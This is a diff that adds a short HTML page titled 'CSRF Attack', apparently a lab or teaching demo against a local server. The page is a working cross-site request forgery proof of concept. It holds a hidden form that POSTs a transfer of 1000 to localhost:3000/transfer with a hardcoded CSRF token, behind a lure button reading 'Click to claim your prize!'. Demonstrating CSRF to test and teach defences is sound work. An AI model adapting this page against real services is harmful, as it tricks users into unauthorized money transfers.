@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack in Action</h1>
+    <form method="POST" action="http://localhost:3000/transfer">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="_csrf" value="7Dp-yLYrcDLx6DpjAcDJVx-a">
+        <button type="submit">Click to claim your prize!</button>
+    </form>
+</body>
+</html>
